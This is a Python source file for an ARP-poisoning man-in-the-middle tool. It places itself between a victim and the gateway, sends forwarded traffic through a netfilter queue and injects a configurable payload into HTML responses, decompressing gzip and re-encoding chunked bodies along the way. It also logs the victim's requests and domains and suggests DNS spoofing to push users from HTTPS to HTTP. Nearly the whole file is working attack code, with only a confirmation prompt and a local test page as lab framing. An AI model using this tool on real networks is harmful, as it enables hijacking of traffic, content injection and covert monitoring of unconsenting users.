#!/usr/bin/env python3
"""
Improved HTTP Interceptor with Better Detection and Testing Capabilities
Addresses issues with modern web usage and HTTPS prevalence
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import re
import zlib
import io
import gzip
import logging
from datetime import datetime
import subprocess
import threading

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig

# Use configuration values
victim_ip = AttackConfig.VICTIM_IP
gateway_ip = AttackConfig.GATEWAY_IP
interface = NetworkConfig.INTERFACE
victim_mac = AttackConfig.VICTIM_MAC
gateway_mac = AttackConfig.GATEWAY_MAC

# Get current injection payload
injection_code = AttackConfig.INJECTION_PAYLOADS.get(
    AttackConfig.CURRENT_PAYLOAD,
    AttackConfig.INJECTION_CODE
)

# Setup detailed logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('improved_http_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class HTTPInterceptorStats:
    """Track interception statistics"""
    def __init__(self):
        self.total_packets = 0
        self.http_packets = 0
        self.https_packets = 0
        self.successful_injections = 0
        self.failed_injections = 0
        self.skipped_non_html = 0
        self.domains_seen = set()
        self.start_time = time.time()
    
    def print_stats(self):
        runtime = time.time() - self.start_time
        logger.info(f"\n{'='*50}")
        logger.info(f"📊 HTTP INTERCEPTOR STATISTICS")
        logger.info(f"{'='*50}")
        logger.info(f"⏱️  Runtime: {runtime:.1f} seconds")
        logger.info(f"📦 Total packets: {self.total_packets}")
        logger.info(f"🔓 HTTP packets: {self.http_packets}")
        logger.info(f"🔒 HTTPS packets: {self.https_packets}")
        logger.info(f"✅ Successful injections: {self.successful_injections}")
        logger.info(f"❌ Failed injections: {self.failed_injections}")
        logger.info(f"⏩ Skipped non-HTML: {self.skipped_non_html}")
        logger.info(f"🌐 Unique domains seen: {len(self.domains_seen)}")
        
        if self.domains_seen:
            logger.info(f"📋 Domains intercepted:")
            for domain in sorted(self.domains_seen):
                logger.info(f"   • {domain}")
        
        # Calculate success rate
        if self.http_packets > 0:
            success_rate = (self.successful_injections / self.http_packets) * 100
            logger.info(f"🎯 HTTP injection success rate: {success_rate:.1f}%")
        
        # Provide recommendations
        self.print_recommendations()
    
    def print_recommendations(self):
        logger.info(f"\n💡 RECOMMENDATIONS:")
        
        if self.https_packets > self.http_packets * 2:
            logger.warning("⚠️  Most traffic is HTTPS - consider:")
            logger.warning("   • Setting up a local HTTP test server")
            logger.warning("   • Using DNS spoofing to redirect HTTPS to HTTP")
            logger.warning("   • Testing with specific HTTP-only sites")
        
        if self.successful_injections == 0:
            logger.warning("⚠️  No successful injections - try:")
            logger.warning("   • Browsing to http://neverssl.com")
            logger.warning("   • Browsing to http://httpforever.com")
            logger.warning("   • Setting up a local HTTP web server")
        
        if len(self.domains_seen) < 3:
            logger.warning("⚠️  Limited domain diversity - consider:")
            logger.warning("   • Testing with more varied browsing")
            logger.warning("   • Using multiple victim devices")

stats = HTTPInterceptorStats()

def enable_ip_forwarding():
    """Enable IP forwarding for MITM"""
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                logger.info("[SETUP] ✅ IP forwarding enabled successfully")
                return True
            else:
                logger.warning("[SETUP] ⚠️ IP forwarding may not be enabled")
                return False
    except:
        logger.warning("[SETUP] Could not verify IP forwarding status")
        return False

def disable_ip_forwarding():
    """Disable IP forwarding"""
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def setup_local_http_server():
    """Setup a local HTTP server for testing"""
    logger.info("[SETUP] Setting up local HTTP test server on port 8000")
    
    # Create a simple HTML page for testing
    html_content = """<!DOCTYPE html>
<html>
<head>
    <title>HTTP Test Page</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .test-area { background: #f0f0f0; padding: 20px; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>HTTP Injection Test Page</h1>
    <div class="test-area">
        <h2>This is a test page for HTTP injection</h2>
        <p>If the attack is working, you should see injected content at the top of this page.</p>
        <p>Current time: <span id="time"></span></p>
        <script>
            document.getElementById('time').textContent = new Date().toLocaleString();
        </script>
    </div>
    <p><a href="/">Refresh this page</a></p>
</body>
</html>"""
    
    with open('/tmp/test_page.html', 'w') as f:
        f.write(html_content)
    
    # Start simple HTTP server in background
    def start_server():
        try:
            os.chdir('/tmp')
            subprocess.run(['python3', '-m', 'http.server', '8000'], 
                         capture_output=True, check=False)
        except:
            pass
    
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    logger.info("[SETUP] ✅ Local HTTP server started")
    logger.info("[SETUP] 💡 Test by browsing to: http://localhost:8000/test_page.html")

def poison(victim_ip, victim_mac, spoof_ip):
    """Send ARP poison packet"""
    pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(pkt, iface=interface, verbose=0)

def restore(target_ip, target_mac, source_ip, source_mac):
    """Restore ARP table"""
    logger.info(f"[ARP-RESTORE] Restoring {target_ip} -> {source_ip} mapping")
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=source_ip, hwsrc=source_mac)
    sendp(pkt, count=5, iface=interface, verbose=0)

def extract_domain_from_headers(headers_text):
    """Extract domain from HTTP headers"""
    try:
        for line in headers_text.split('\n'):
            if line.lower().startswith('host:'):
                return line.split(':', 1)[1].strip()
    except:
        pass
    return None

def is_interesting_content(content_type, content_length):
    """Determine if content is worth injecting into"""
    if not content_type:
        # If no content type, but we have substantial content, try anyway
        try:
            if content_length and int(content_length) > 200:
                return True
        except:
            pass
        return False
    
    # Check for HTML content
    if 'text/html' not in content_type.lower():
        return False
    
    # Be more permissive with content length - allow smaller responses too
    try:
        if content_length and int(content_length) < 100:  # Reduced from 500 to 100
            return False
    except:
        pass
    
    return True

def decode_chunked(data):
    """Decode HTTP chunked transfer encoding"""
    decoded = b""
    chunk_count = 0
    pos = 0
    
    try:
        while pos < len(data):
            # Find the end of the chunk size line
            end_pos = data.find(b"\r\n", pos)
            if end_pos == -1:
                break
                
            # Extract chunk size (in hex)
            chunk_size_str = data[pos:end_pos].decode('ascii', errors='ignore')
            try:
                chunk_size = int(chunk_size_str, 16)
            except ValueError:
                logger.warning(f"[CHUNKED] Invalid chunk size: {chunk_size_str}")
                break
            
            chunk_count += 1
            
            # If chunk size is 0, we're done
            if chunk_size == 0:
                break
                
            # Move past the chunk size line
            pos = end_pos + 2
            
            # Extract the chunk data
            if pos + chunk_size > len(data):
                logger.warning(f"[CHUNKED] Chunk {chunk_count} extends beyond data")
                break
                
            decoded += data[pos:pos + chunk_size]
            pos += chunk_size + 2  # Skip the trailing \r\n
            
        logger.info(f"[CHUNKED] Decoded {chunk_count} chunks, total size: {len(decoded)} bytes")
        return decoded
        
    except Exception as e:
        logger.warning(f"[CHUNKED] Error decoding chunked data: {e}")
        return data  # Return original data if decoding fails

def encode_chunked(data):
    """Encode data using HTTP chunked transfer encoding"""
    chunks = []
    chunk_size = 1024
    chunk_count = 0
    
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append(b"%X\r\n" % len(chunk) + chunk + b"\r\n")
        chunk_count += 1
        
    chunks.append(b"0\r\n\r\n")  # End chunk
    logger.info(f"[CHUNKED] Encoded {chunk_count} chunks")
    return b"".join(chunks)

def inject_at_top(html_bytes, injection_code):
    """Insert injection code at the top of HTML content"""
    pattern = re.compile(b"(<body[^>]*>)", re.IGNORECASE)
    match = pattern.search(html_bytes)
    if match:
        insert_pos = match.end()
        logger.info(f"[INJECTION] Found <body> tag at position {match.start()}-{match.end()}")
        return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
    else:
        # Try to find after <head> section
        head_pattern = re.compile(b"(</head>)", re.IGNORECASE)
        head_match = head_pattern.search(html_bytes)
        if head_match:
            insert_pos = head_match.end()
            logger.info(f"[INJECTION] Found </head> tag, inserting after")
            return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
        else:
            # Fallback: prepend to content
            logger.warning(f"[INJECTION] No <body> or </head> tag found, prepending to content")
            return injection_code + html_bytes

def analyze_traffic_patterns():
    """Analyze traffic patterns to provide insights"""
    logger.info("\n🔍 TRAFFIC ANALYSIS:")
    logger.info("   Monitoring HTTP vs HTTPS traffic patterns...")
    
    # This would be implemented with more sophisticated analysis
    # For now, we'll rely on the stats collection in modify_packet

def modify_packet(packet):
    """Main packet modification function with improved detection"""
    scapy_pkt = IP(packet.get_payload())
    stats.total_packets += 1
    
    src_ip = scapy_pkt.src
    dst_ip = scapy_pkt.dst
    
    # Check if this traffic involves our target victim
    is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
    
    if not is_victim_traffic:
        packet.accept()
        return
    
    # Check for HTTPS traffic (port 443)
    if scapy_pkt.haslayer(TCP):
        tcp_layer = scapy_pkt[TCP]
        if tcp_layer.dport == 443 or tcp_layer.sport == 443:
            stats.https_packets += 1
            if stats.https_packets % 10 == 0:  # Log every 10th HTTPS packet
                logger.info(f"[HTTPS] 🔒 HTTPS traffic detected: {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
            packet.accept()
            return
    
    # Only process TCP packets with payload
    if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
        packet.accept()
        return

    tcp_layer = scapy_pkt[TCP]
    payload = scapy_pkt[Raw].load
    
    # Check for HTTP traffic
    if tcp_layer.dport == 80 or tcp_layer.sport == 80:
        stats.http_packets += 1
        
        # Log HTTP requests
        if payload.startswith(b"GET ") or payload.startswith(b"POST "):
            try:
                first_line = payload.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                logger.info(f"[HTTP-REQUEST] {first_line}")
                
                # Extract domain from headers
                headers_text = payload.decode('utf-8', errors='ignore')
                domain = extract_domain_from_headers(headers_text)
                if domain:
                    stats.domains_seen.add(domain)
                    logger.info(f"[HTTP-REQUEST] Host: {domain}")
            except:
                pass
        
        # Check for HTTP responses
        elif payload.startswith(b"HTTP/"):
            logger.info(f"[HTTP-RESPONSE] ⭐ Response intercepted: {src_ip} -> {dst_ip}")
            
            try:
                # Split headers and body
                header_raw, body = payload.split(b"\r\n\r\n", 1)
                headers_text = header_raw.decode('utf-8', errors='ignore')
                
                # Extract important headers
                header_dict = {}
                for line in headers_text.split("\r\n")[1:]:
                    if ':' in line:
                        key, value = line.split(":", 1)
                        header_dict[key.strip().lower()] = value.strip().lower()
                
                content_type = header_dict.get("content-type", "")
                content_length = header_dict.get("content-length", "")
                content_encoding = header_dict.get("content-encoding", "")
                transfer_encoding = header_dict.get("transfer-encoding", "")
                
                # Log response details
                logger.info(f"[HTTP-RESPONSE] Content-Type: {content_type}")
                logger.info(f"[HTTP-RESPONSE] Content-Length: {content_length}")
                logger.info(f"[HTTP-RESPONSE] Content-Encoding: {content_encoding}")
                logger.info(f"[HTTP-RESPONSE] Transfer-Encoding: {transfer_encoding}")
                logger.info(f"[HTTP-RESPONSE] Body size: {len(body)} bytes")
                
                # Handle chunked transfer encoding first
                is_chunked = transfer_encoding == "chunked"
                if is_chunked:
                    logger.info("[HTTP-CHUNKED] Processing chunked transfer encoding")
                    body = decode_chunked(body)
                    logger.info(f"[HTTP-CHUNKED] Decoded body size: {len(body)} bytes")
                
                # Check if this is interesting content
                if is_interesting_content(content_type, content_length):
                    logger.warning(f"[HTTP-INTERESTING] 🎯 Found interesting content: {content_type}")
                    
                    # Handle gzip compression with better error handling
                    if content_encoding == "gzip":
                        logger.info("[HTTP-GZIP] Processing gzip-compressed content")
                        
                        try:
                            # Try to decompress gzip
                            decompressed = gzip.decompress(body)
                            logger.info(f"[HTTP-GZIP] ✅ Successfully decompressed {len(body)} -> {len(decompressed)} bytes")
                            
                            # Inject into decompressed content
                            injected_body = inject_at_top(decompressed, injection_code)
                            
                            # Recompress
                            buf = io.BytesIO()
                            with gzip.GzipFile(fileobj=buf, mode='wb') as f:
                                f.write(injected_body)
                            new_body = buf.getvalue()
                            
                            logger.info(f"[HTTP-GZIP] ✅ Recompressed to {len(new_body)} bytes")
                            
                        except gzip.BadGzipFile as e:
                            logger.warning(f"[HTTP-GZIP] ❌ Bad gzip file: {e}")
                            logger.warning(f"[HTTP-GZIP] 🔄 Falling back to raw injection")
                            # Fall back to raw injection
                            new_body = inject_at_top(body, injection_code)
                            # Remove gzip encoding header since we're not compressing
                            headers_text = re.sub(r"(?i)^(Content-Encoding:\s*)gzip", 
                                                r"", headers_text, flags=re.MULTILINE)
                            headers_text = re.sub(r"\n\n+", "\n", headers_text)  # Clean up empty lines
                            
                        except Exception as e:
                            logger.warning(f"[HTTP-GZIP] ❌ Gzip decompression failed: {e}")
                            logger.warning(f"[HTTP-GZIP] 🔄 Trying partial decompression...")
                            
                            # Try partial decompression for fragmented responses
                            try:
                                # Try to decompress what we have
                                decompressor = zlib.decompressobj(16+zlib.MAX_WBITS)  # gzip format
                                partial_decompressed = decompressor.decompress(body)
                                
                                if len(partial_decompressed) > 100:  # If we got some meaningful content
                                    logger.info(f"[HTTP-GZIP] ✅ Partial decompression successful: {len(partial_decompressed)} bytes")
                                    injected_body = inject_at_top(partial_decompressed, injection_code)
                                    
                                    # Recompress
                                    buf = io.BytesIO()
                                    with gzip.GzipFile(fileobj=buf, mode='wb') as f:
                                        f.write(injected_body)
                                    new_body = buf.getvalue()
                                else:
                                    raise Exception("Partial decompression yielded too little data")
                                    
                            except Exception as e2:
                                logger.warning(f"[HTTP-GZIP] ❌ Partial decompression also failed: {e2}")
                                logger.warning(f"[HTTP-GZIP] 🔄 Falling back to raw injection without decompression")
                                # Final fallback: inject into raw body and remove gzip header
                                new_body = inject_at_top(body, injection_code)
                                # Remove gzip encoding header
                                headers_text = re.sub(r"(?i)^(Content-Encoding:\s*)gzip", 
                                                    r"", headers_text, flags=re.MULTILINE)
                                headers_text = re.sub(r"\n\n+", "\n", headers_text)  # Clean up empty lines
                    else:
                        # Non-gzip content - direct injection
                        logger.info("[HTTP-PLAIN] Processing non-compressed content")
                        new_body = inject_at_top(body, injection_code)
                    
                    # Re-encode as chunked if originally chunked
                    if is_chunked:
                        logger.info("[HTTP-CHUNKED] Re-encoding as chunked")
                        new_body = encode_chunked(new_body)
                        # Don't update Content-Length for chunked encoding
                    else:
                        # Update Content-Length header for non-chunked responses
                        if content_length:
                            new_length = str(len(new_body))
                            headers_text = re.sub(
                                r"(?i)^(Content-Length:\s*)\d+",
                                f"Content-Length: {new_length}",
                                headers_text, flags=re.MULTILINE
                            )
                            logger.info(f"[HTTP-HEADERS] Updated Content-Length: {content_length} -> {new_length}")
                    
                    # Rebuild packet
                    new_payload = headers_text.encode() + b"\r\n\r\n" + new_body
                    scapy_pkt[Raw].load = new_payload
                    
                    # Clear checksums for recalculation
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_pkt))
                    stats.successful_injections += 1
                    logger.info(f"[INJECTION] ✅ Successfully injected content!")
                    
                else:
                    # Not interesting content
                    stats.skipped_non_html += 1
                    logger.info(f"[HTTP-SKIP] Skipping non-interesting content: {content_type}")
                    
            except ValueError as e:
                logger.warning(f"[HTTP-ERROR] Could not split headers and body: {e}")
                logger.warning(f"[HTTP-ERROR] Payload preview: {payload[:100]}...")
                stats.failed_injections += 1
            except Exception as e:
                logger.error(f"[HTTP-ERROR] Error processing response: {e}")
                stats.failed_injections += 1
    
    packet.accept()

def start_packet_injection():
    """Start packet interception"""
    logger.info("[SETUP] Setting up iptables rule for packet interception")
    
    # Clear existing rules first
    os.system("iptables -F")
    os.system("iptables -X")
    
    # Add our rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify iptables rule was added
    try:
        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], 
                              capture_output=True, text=True)
        if 'NFQUEUE' in result.stdout:
            logger.info("[SETUP] ✅ iptables NFQUEUE rule successfully added")
        else:
            logger.warning("[SETUP] ⚠️ iptables rule may not have been added correctly")
    except:
        logger.warning("[SETUP] Could not verify iptables rule")
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_packet)
    
    logger.info("[MITM] 🚀 Improved HTTP injection system started")
    logger.info("[MITM] 📡 Monitoring for HTTP traffic...")
    logger.info(f"[MITM] 🎯 Target: {victim_ip} -> Gateway: {gateway_ip}")
    logger.info(f"[MITM] 💉 Injection payload: {AttackConfig.CURRENT_PAYLOAD}")
    logger.info("[MITM] 🛑 Press Ctrl+C to stop and view statistics")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        logger.info("\n[MITM] 🛑 Stopping HTTP injector...")
    finally:
        nfqueue.unbind()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        stats.print_stats()

def print_testing_guide():
    """Print comprehensive testing guide"""
    print("\n" + "="*70)
    print("🎯 IMPROVED HTTP INTERCEPTOR - TESTING GUIDE")
    print("="*70)
    
    print("\n💡 WHY YOUR ORIGINAL INTERCEPTOR SEEMED BROKEN:")
    print("   • Most websites use HTTPS (encrypted) - can't be intercepted")
    print("   • HTTP traffic is mostly captive portal detection (tiny pages)")
    print("   • Real web browsing happens over HTTPS port 443")
    print("   • Your interceptor WAS working - just on the wrong content!")
    
    print("\n🔧 IMPROVEMENTS IN THIS VERSION:")
    print("   • Better traffic analysis and statistics")
    print("   • Distinguish between HTTP and HTTPS traffic")
    print("   • Skip uninteresting content (small redirects, etc.)")
    print("   • Focus on substantial HTML content")
    print("   • Provide testing recommendations")
    
    print("\n🧪 TESTING STEPS:")
    print("   1. Start this improved interceptor")
    print("   2. From victim machine, browse to HTTP sites:")
    print("      • http://neverssl.com")
    print("      • http://httpforever.com")
    print("      • http://example.com")
    print("      • http://localhost:8000/test_page.html (if local server setup)")
    print("   3. Check logs for successful injections")
    print("   4. View statistics with Ctrl+C")
    
    print("\n⚠️  EXPECTATIONS:")
    print("   • HTTPS sites (google.com, facebook.com) won't be affected")
    print("   • Only HTTP sites will show injected content")
    print("   • Most modern browsing is HTTPS - this is normal!")
    
    print("="*70)

def main():
    """Main function"""
    print_testing_guide()
    
    # Ask for confirmation
    if SecurityConfig.REQUIRE_CONFIRMATION:
        print("\n" + "="*70)
        confirmation = input("🔍 Do you want to proceed with the improved HTTP interceptor? [y/N]: ").lower().strip()
        if confirmation not in ['y', 'yes']:
            print("❌ Attack cancelled by user.")
            sys.exit(0)
    
    logger.info("[ATTACK] 🚀 Starting improved ARP poisoning & HTTP injection")
    logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
    
    # Setup local HTTP server for testing
    setup_local_http_server()
    
    # Enable IP forwarding
    if not enable_ip_forwarding():
        logger.error("❌ Failed to enable IP forwarding")
        sys.exit(1)

    def exit_gracefully(signum, frame):
        logger.info("\n[CLEANUP] 🧹 Starting cleanup process...")
        logger.info("[CLEANUP] Restoring ARP tables...")
        
        # Restore ARP tables
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        
        disable_ip_forwarding()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        
        # Print final statistics
        stats.print_stats()
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start ARP poisoning in background
    def poison_loop():
        logger.info("[ARP-POISON] 🎯 Starting continuous ARP poisoning")
        logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
        
        poison_count = 0
        while True:
            # Poison victim: tell victim that gateway is at attacker's MAC
            poison(victim_ip, victim_mac, gateway_ip)
            
            # Poison gateway: tell gateway that victim is at attacker's MAC
            poison(gateway_ip, gateway_mac, victim_ip)
            
            poison_count += 2
            if poison_count % 10 == 0:
                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets")
            
            time.sleep(AttackConfig.ARP_POISON_INTERVAL)

    poison_thread = threading.Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Give ARP poisoning time to take effect
    logger.info("[ATTACK] Waiting 3 seconds for ARP poisoning to take effect...")
    time.sleep(3)

    # Start HTTP injection
    start_packet_injection()

if __name__ == "__main__":
    main() 